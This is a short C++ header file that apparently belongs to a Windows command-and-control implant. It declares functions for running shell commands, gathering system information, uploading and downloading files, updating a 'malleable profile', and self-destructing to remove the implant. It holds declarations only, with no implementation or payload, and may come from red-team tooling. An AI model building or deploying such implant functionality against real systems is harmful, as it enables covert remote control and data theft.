#ifndef CMD_H
#define CMD_H

#include <windows.h>
#include <string>
#include <vector>
#include "profile.h"


/**
 * Functions for command line execution
*/
LPBYTE ExecuteCmd(LPCSTR szCmdline, PSIZE_T stOut);
LPBYTE ExecuteCmdArgVector(std::vector<std::string> args, PSIZE_T outSize);

/**
 * Stops a given implant and removes it from the system
*/
void SelfDestruct();

/**
 * Get basic system information about this system
*/
std::string SysInfo();

/**
 * Takes in a JSON object of changes to make to the profile and updates the profile
*/
void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile);

std::string Upload(rapidjson::Value* uploaded);

std::string Download(std::string filepath);

#endif